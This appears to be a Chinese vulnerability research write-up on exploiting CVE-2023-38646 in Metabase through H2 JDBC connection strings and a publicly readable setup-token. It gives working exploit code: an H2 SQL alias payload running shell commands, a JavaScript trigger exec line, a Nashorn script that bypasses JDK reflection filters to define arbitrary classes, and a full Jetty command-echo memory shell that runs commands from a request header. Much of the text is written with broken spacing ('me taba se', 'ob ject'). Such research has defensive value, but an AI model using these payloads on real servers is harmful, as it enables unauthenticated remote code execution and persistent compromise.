## 0x01 概述

最近 me taba se 出了一个远程代码执行漏洞（CVE-2023-38646），我们通过研究分析发现该漏洞是通过 JDBC 来利用的。在 me
taba se 中兼容了多种数据库，本次漏洞中主要通过 H2 JDBC 连接信息触发漏洞。目前公开针对 H2
数据库深入利用的技术仅能做到简单命令执行，无法满足实际攻防场景。

之前 pyn3rd 发布的 《Make JDBC Attacks Brilliant Again I 》 对 H2 数据库的利用中可以通过 RUNsc
ript、TRIGGER 来执行代码， **通过本次漏洞利用 TRIGGER + DefineClass 完整的实现了 JAVA
代码执行和漏洞回显，且在公开仅支持 Jetty10 版本的情况下兼容到了 Jetty11** ，以下是我们在 Goby 中成果。

![](https://image.3001.net/images/20230728/1690543000_64c3a3980a127f4b39394.gif!small)

## 0x02 环境构建

研究采用 Vulfocus 构建，由于 Meabse 在官方 Docker 只有 x86 架构，为了我们 M1 芯片研究更高效，我们制作了 ARM
架构的镜像。

在线环境：[https://vulfocus.cn/#/dashboard?image_id=4a5e263f-8662-46bf-a67a-13bd72cf976c](https://link.zhihu.com/?target=https%3A//vulfocus.cn/%23/dashboard%3Fimage_id%3D4a5e263f-8662-46bf-a67a-13bd72cf976c)

离线环境：docker run -d -P vulfocus/vcpe-1.0-a-me taba se-me taba
se:0.46.6-openjdk-release

## 0x03 漏洞分析

本次漏洞主要是由于 me taba se 中数据库连接中出现的安全风险漏洞，在整个产品可通过 me taba se
安装时配置数据源数据库以及在安装之后在系统管理中配置数据库信息。所以整体的漏洞点即可通过安装以及配置数据源开始。

在产品安装时会调用 /api/setup/validate 来对参数校验，其中最为核心的部分对数据库的连接信息校验。

![](https://image.3001.net/images/20230728/1690543060_64c3a3d4068c974e4bd83.png!small)

从函数调用的逻辑来看，/api/setup/validate 会通过 api.databa se/test-databa se-connection
来处理输入的参数完成对数据库的校验。但本身 api.databa se/test-databa se-connection 其实就是 POST
/api/databa se 路由的核心处理参数。

![](https://image.3001.net/images/20230728/1690543070_64c3a3de9f8339a9a3eea.png!small)

从整体的逻辑来看，该漏洞可通过 setup、databa se 两种方式来完成对漏洞验证，不同的是 setup 方式在安装时是不需要权限的，databa
se 需要管理员权限。

setup 在安装时会校验 setup-token 参数是否正确，来判断是否要进行下步的数据库连接。

![](https://image.3001.net/images/20230728/1690543079_64c3a3e7a9bec286f39c6.png!small)

而 setup-token 在进行生成的时候被默认设置为了 public 权限，所以可以通过 /api/session/properties 来读取。

![](https://image.3001.net/images/20230728/1690543087_64c3a3efdd8beaa85abe2.png!small)![](https://image.3001.net/images/20230728/1690543097_64c3a3f9b0b0528d41ead.png!small)

## 0x04 深入利用

在漏洞分析章节中说明，我们可以通过 setup + setup-token 来完整的漏洞利用。在利用时主要依靠于数据库的类型，目前 me taba se 支
持多种数据库，本次我们重点说明 H2 数据库的深入利用，目前最为常用利用方式是 RUNsc ript 、TRIGGER 来完成对漏洞的利用。

H2 数据库在数据库时拥有函数 init 参数，该参数可以执行任意一条 SQL 语句，所以在整体围绕利用中主要通过一条 SQL
语句变换成完美的漏洞利用链条。

![](https://image.3001.net/images/20230728/1690543108_64c3a404c6d9653da0730.png!small)

###  **4.1** **RUNSCRIRT**

RUNsc ript FROM 可以使用 HTTP 协议执行远程的 SQL 语句，那么在利用的时候我们即可构造恶意的 SQL 语句来完成对漏洞利用。

在执行 SQL 语句时 CREATE ALIAS 来会将内容值进行 javac 编译之后然后运行。

![](https://image.3001.net/images/20230728/1690543120_64c3a410470094c265247.png!small)

    
    
    DROP ALIAS IF EXISTS sehll;CREATE ALIAS sehll AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "hello";}';CALL sehll ('touch /tmp/123')

![](https://image.3001.net/images/20230728/1690543144_64c3a428342da9ec33338.png!small)

需要注意的是默认官方发布的 Docker 镜像中没用 javc 命令，所以 CREATE ALIAS 无法正常使用。

![](https://image.3001.net/images/20230728/1690543154_64c3a432468a6df1b9c7d.png!small)

但是该方式需要依赖 HTTP 服务，通常禁止向外部网络建立 HTTP 协议请求，所以这种方式在真实的攻击中发挥的作用就会小很多。

###  **4.2 TRIGGER**

H2 在解析 init 参数时对 CREATE TRIGGER 会由 loadFromSource 做特殊处理，根据执行内容的开头来判断是否为需要通过 ja
vasc ript 引擎执行。如果以 //ja vasc ript 开头就会通过 ja vasc ript 引擎进行编译然后进行执行。

![](https://image.3001.net/images/20230728/1690543162_64c3a43a5bf525146554c.png!small)

我们就可以通过 ja vasc ript 引擎来实现代码执行，不过该方式在 JDK 15 之后移除了默认的解析，但是有意思的是 me taba se
在项目中使用到了 js 引擎技术。

![](https://image.3001.net/images/20230728/1690543170_64c3a442f3844c5db8690.png!small)

最后我们即可构建 ja vasc ript 引擎来构建代码执行，如：

    
    
    java.lang.Runtime.getRuntime().exec('touch /tmp/999')

![](https://image.3001.net/images/20230728/1690543181_64c3a44dddead21d8e7f6.png!small)

 **4.3 Define Class**

通过 TIGGER 我们可以进行 ja vasc ript 引擎的任意代码执行，所以为了能够更加入的利用非常有必要进行自定义 Class
加载以及执行。由于最新版的 me taba se 对 JDK 运行产生了限制必须要求为 JDK >= 11，所以就必须要解决 JDK9
modules、JDK 11 ReflectionFilter 的问题。

针对类似问题，我们对 ja vasc ript 脚本进行了高度的兼容以及高版本 JDK 的 Bypass 操作，核心代码如下：

    
    
    try {
      load("nashorn:mozilla_compat.js");
    } catch (e) {}
    function getUnsafe(){
      var theUnsafeMethod = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
      theUnsafeMethod.setAccessible(true); 
      return theUnsafeMethod.get(null);
    }
    function removeClassCache(clazz){
      var unsafe = getUnsafe();
      var clazzAnonymousClass = unsafe.defineAnonymousClass(clazz,java.lang.Class.forName("java.lang.Class").getResourceAsStream("Class.class").readAllBytes(),null);
      var reflectionDataField = clazzAnonymousClass.getDeclaredField("reflectionData");
      unsafe.putob ject(clazz,unsafe.ob jectFieldOffset(reflectionDataField),null);
    }
    function bypassReflectionFilter() {
      var reflectionClass;
      try {
        reflectionClass = java.lang.Class.forName("jdk.internal.reflect.Reflection");
      } catch (error) {
        reflectionClass = java.lang.Class.forName("sun.reflect.Reflection");
      }
      var unsafe = getUnsafe();
      var classBuffer = reflectionClass.getResourceAsStream("Reflection.class").readAllBytes();
      var reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, null);
      var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField("fieldFilterMap");
      var methodFilterMapField = reflectionAnonymousClass.getDeclaredField("methodFilterMap");
      if (fieldFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
        unsafe.putob ject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
      }
      if (methodFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
        unsafe.putob ject(reflectionClass, unsafe.staticFieldOffset(methodFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
      }
      removeClassCache(java.lang.Class.forName("java.lang.Class"));
    }
    function setAccessible(accessibleob ject){
        var unsafe = getUnsafe();
        var overrideField = java.lang.Class.forName("java.lang.reflect.Accessibleob ject").getDeclaredField("override");
        var offset = unsafe.ob jectFieldOffset(overrideField);
        unsafe.putBoolean(accessibleob ject, offset, true);
    }
    function defineClass(){
      var clz = null;
      var version = java.lang.System.getProperty("java.version");
      var unsafe = getUnsafe();
      var classLoader = new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0));
      try{
        if (version.split(".")[0] >= 11) {
          bypassReflectionFilter();
        defineClassMethod = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", java.lang.Class.forName("[B"),java.lang.Integer.TYPE, java.lang.Integer.TYPE);
        setAccessible(defineClassMethod);
        // 绕过 setAccessible 
        clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);
        }else{
          var protectionDomain = new java.security.ProtectionDomain(new java.security.CodeSource(null, java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.security.cert.Certificate"), 0)), null, classLoader, []);
          clz = unsafe.defineClass(null, bytes, 0, bytes.length, classLoader, protectionDomain);
        }
      }catch(error){
        error.printStackTrace();
      }finally{
        return clz;
      }
    }
    defineClass();

###  **4.3 漏洞回显**

在漏洞回显时，我们就可以借助 DefineClass 来执行完成对漏洞的回显利用，但是目前最新版本的 me taba se 使用
Jetty11，所以需要针对该版本做回显适配，核心代码如下：

    
    
    import java.io.OutputStream;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.util.Scanner;
    
    /**
     * Jetty CMD 回显马
     * @author R4v3zn woo0nise@gmail.com
     * @version 1.0.1
     */
    public class JE2 {
    
        public JE2(){
            try{
                invoke();
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    
        public void invoke()throws Exception{
            ThreadGroup group = Thread.currentThread().getThreadGroup();
            java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
            f.setAccessible(true);
            Thread[] threads = (Thread[]) f.get(group);
            thread : for (Thread thread: threads) {
                try{
                    Field threadLocalsField = thread.getClass().getDeclaredField("threadLocals");
                    threadLocalsField.setAccessible(true);
                    ob ject threadLocals = threadLocalsField.get(thread);
                    if (threadLocals == null){
                        continue;
                    }
                    Field tableField = threadLocals.getClass().getDeclaredField("table");
                    tableField.setAccessible(true);
                    ob ject tableValue = tableField.get(threadLocals);
                    if (tableValue == null){
                        continue;
                    }
                    ob ject[] tables =  (ob ject[])tableValue;
                    for (ob ject table:tables) {
                        if (table == null){
                            continue;
                        }
                        Field valueField = table.getClass().getDeclaredField("value");
                        valueField.setAccessible(true);
                        ob ject value = valueField.get(table);
                        if (value == null){
                            continue;
                        }
                        System.out.println(value.getClass().getName());
                        if(value.getClass().getName().endsWith("AsyncHttpConnection")){
                            Method method = value.getClass().getMethod("getRequest", null);
                            value = method.invoke(value, null);
                            method = value.getClass().getMethod("getHeader", new Class[]{String.class});
                            String cmd = (String)method.invoke(value, new ob ject[]{"cmd"});
                            String result = "\n"+exec(cmd);
                            method = value.getClass().getMethod("getPrintWriter", new Class[]{String.class});
                            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(value, new ob ject[]{"utf-8"});
                            printWriter.println(result);
                            printWriter.flush();
                            break thread;
                        }else if(value.getClass().getName().endsWith("HttpConnection")){
                            Method method = value.getClass().getDeclaredMethod("getHttpChannel", null);
                            ob ject httpChannel = method.invoke(value, null);
                            method = httpChannel.getClass().getMethod("getRequest", null);
                            value = method.invoke(httpChannel, null);
                            method = value.getClass().getMethod("getHeader", new Class[]{String.class});
                            String cmd = (String)method.invoke(value, new ob ject[]{"cmd"});
                            String result = "\n"+exec(cmd);
                            method = httpChannel.getClass().getMethod("getResponse", null);
                            value = method.invoke(httpChannel, null);
                            method = value.getClass().getMethod("getWriter", null);
                            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(value, null);
                            printWriter.println(result);
                            printWriter.flush();
                            break thread;
                        }else if (value.getClass().getName().endsWith("Channel")){
                            Field underlyingOutputField = value.getClass().getDeclaredField("underlyingOutput");
                            underlyingOutputField.setAccessible(true);
                            ob ject underlyingOutput = underlyingOutputField.get(value);
                            ob ject httpConnection;
                            try{
                                Field _channelField = underlyingOutput.getClass().getDeclaredField("_channel");
                                _channelField.setAccessible(true);
                                httpConnection = _channelField.get(underlyingOutput);
                            }catch (Exception e){
                                Field connectionField = underlyingOutput.getClass().getDeclaredField("this$0");
                                connectionField.setAccessible(true);
                                httpConnection = connectionField.get(underlyingOutput);
                            }
                            ob ject request = httpConnection.getClass().getMethod("getRequest").invoke(httpConnection);
                            ob ject response = httpConnection.getClass().getMethod("getResponse").invoke(httpConnection);
                            String cmd = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, "cmd");
                            OutputStream outputStream = (OutputStream)response.getClass().getMethod("getOutputStream").invoke(response);
                            String result = "\n"+exec(cmd);
                            outputStream.write(result.getBytes());
                            outputStream.flush();
                            break thread;
                        }
                    }
                }catch (Exception e){}
            }
        }
    
        public String exec(String cmd){
            if (cmd != null && !"".equals(cmd)) {
                String os = System.getProperty("os.name").toLowerCase();
                cmd = cmd.trim();
                Process process = null;
                String[] executeCmd = null;
                if (os.contains("win")) {
                    if (cmd.contains("ping") && !cmd.contains("-n")) {
                        cmd = cmd + " -n 4";
                    }
                    executeCmd = new String[]{"cmd", "/c", cmd};
                } else {
                    if (cmd.contains("ping") && !cmd.contains("-n")) {
                        cmd = cmd + " -t 4";
                    }
                    executeCmd = new String[]{"sh", "-c", cmd};
                }
                try {
                    process = Runtime.getRuntime().exec(executeCmd);
                    Scanner s = new Scanner(process.getInputStream()).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    s = new Scanner(process.getErrorStream()).useDelimiter("\\a");
                    output += s.hasNext()?s.next():"";
                    return output;
                } catch (Exception e) {
                    e.printStackTrace();
                    return e.toString();
                } finally {
                    if (process != null) {
                        process.destroy();
                    }
                }
            } else {
                return "command not null";
            }
        }
    }

## 0x05 总结

本次漏洞利用数据库连接信息触发漏洞，利用 H2 导致可以进行任意命令。我们采用 TRIGGER + DefineClass
完成对漏洞的利用，通过我们的研究分析发现该技术不光可应用在数据库连接中，更多可应用于 H2 的 SQL 注入，完成 SQL 注入 -> 代码执行的过程。

## 0x06 参考

  * [https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/](https://link.zhihu.com/?target=https%3A//pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/)

